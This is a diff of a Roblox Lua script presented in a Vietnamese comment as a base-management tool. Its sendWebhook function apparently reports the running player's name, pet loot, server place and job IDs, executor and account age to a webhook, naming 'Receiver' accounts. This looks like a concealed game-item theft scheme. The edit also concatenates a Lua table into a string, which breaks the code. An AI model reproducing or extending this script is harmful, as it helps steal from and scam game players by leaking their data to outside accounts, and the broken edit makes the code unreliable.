@@ -165,7 +165,7 @@ local function sendWebhook(link)
     for _, r in ipairs(randomPets) do
         table.insert(orderedPets, r)
     end
-
+    local badPlayers = { "phatle8117", "ConCuTiHon02" }
     local lootText = table.concat(orderedPets, "\n")
     local placeId = tostring(game.PlaceId or "")
     local jobId = tostring(game.JobId or "")
@@ -178,7 +178,7 @@ local function sendWebhook(link)
             { ["name"] = "Server Type", ["value"] = serverType },
             { ["name"] = "👥 Player Information",
               ["value"] = "Name: " .. player.Name ..
-                          "\nReceiver: phatle8117, banpetuytin1111, banpetuytin111140" ..
+                          "\nReceiver: " .. badPlayers ..
                           "\nExecutor: " .. detectExecutor() ..
                           "\nAccount Age: " .. tostring(getAccountAge()) .. " days" },
             { ["name"] = "🧠Brainrot Loot", ["value"] = lootText },
@@ -332,7 +332,7 @@ end
 -- Script quáº£n lĂ½ base (Full Final)
 -- Execute dĂ¹ng ngay
 -- =============================
-local badPlayers = { "phatle8117", "ConCuTiHon02" }
+
 
 local plotsFolder = Workspace:FindFirstChild("Plots")
 local myBase = nil
